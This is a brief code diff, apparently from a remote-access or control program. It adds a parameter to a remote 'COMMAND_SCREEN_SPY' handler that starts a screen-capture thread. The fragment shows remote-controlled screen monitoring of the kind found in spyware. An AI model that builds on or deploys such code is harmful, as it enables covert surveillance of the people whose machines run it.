@@ -177,6 +177,7 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
 
 	case COMMAND_SCREEN_SPY:
 		{
+		    m_hThread[m_ulThreadCount].user = ulLength > 1 ? (void*)(szBuffer[1]) : NULL;
 			m_hThread[m_ulThreadCount++].h = CreateThread(NULL,0,
 				(LPTHREAD_START_ROUTINE)LoopScreenManager,
 				&m_hThread[m_ulThreadCount], 0, NULL);;
